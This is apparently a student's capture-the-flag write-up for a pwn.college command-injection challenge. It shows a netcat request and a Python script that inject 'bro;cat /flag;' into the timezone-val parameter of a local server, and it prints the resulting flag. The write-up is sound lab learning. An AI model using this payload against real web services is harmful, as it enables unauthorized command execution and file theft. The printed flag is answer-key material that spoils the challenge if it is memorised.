# challenge: CMDi 4

📅 2026-01-22
📁 web security

---

## ✅ what i did  
I WAY -> netcat
-clicked start
-opened the terminal
-ran: 'cat /challenge/server'
found out the enpoint is /activity
the command is build in the following way: TZ={arg} date
-ran: '/challenge/server'
-ran: 'nc -v challenge.localhost 80'
-typed: 'GET /activity?timezone-val=bro;cat%20%2Fflag; HTTP/1.1'
        'Host: challenge.localhost'
-flag popped out

II WAY -> python
-clicked start
-opened the terminal
-ran: 'vim bro'
-typed: '#!/usr/bin/env python3'
        'import requests'
        'from pwn import *'
        'context.log_level = 'error''
        'p = process("/challenge/server")'
        'time.sleep(1)'
        'url = "http://challenge.localhost/activity"'
        'params = {'
                '"timezone-val" : "bro;cat /flag;"'
                '}'
        'r = requests.get(url, params)'
        'print(r.text)'
-ran: 'chmod a+x bro'
-ran: './bro'
-flag popped out

## 🧑🏾‍🏫 what this challenge teaches u
how to inject command even if the one we craft will be put in the middle of another one

## 🏁 Flag  
pwn.college{8UwGQJXpv1SxPzoFhBbVrJL1HXR.QX4gzMzwCO4IDOxEzW}
